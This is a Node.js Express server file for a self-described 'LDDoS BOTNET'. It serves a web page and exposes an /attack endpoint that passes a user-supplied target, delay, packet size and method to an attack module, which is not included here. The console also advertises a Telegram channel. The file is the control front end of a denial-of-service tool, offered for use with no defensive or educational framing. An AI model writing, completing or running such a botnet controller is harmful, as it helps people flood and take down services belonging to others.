const express = require('express');
const path = require('path');
const attack = require('./attack');

const app = express();
const PORT = process.env.PORT || 5252;

app.use(express.static(path.join(__dirname, '../public')));

app.get('/attack', (req, res) => {
    const { target, delay, kbSize, method } = req.query;
    const delayMs = delay === 'Z' ? 0 : parseInt(delay, 10);
    const kb = parseInt(kbSize, 10);
    attack.start(target, delayMs, kb, method);
    res.send('Attack started!');
});

app.listen(PORT, () => {
    console.log(`LDDoS BOTNET running on port ${PORT}`);
    console.log(`Telegram channel: https://t.me/biosmosntr`);
});
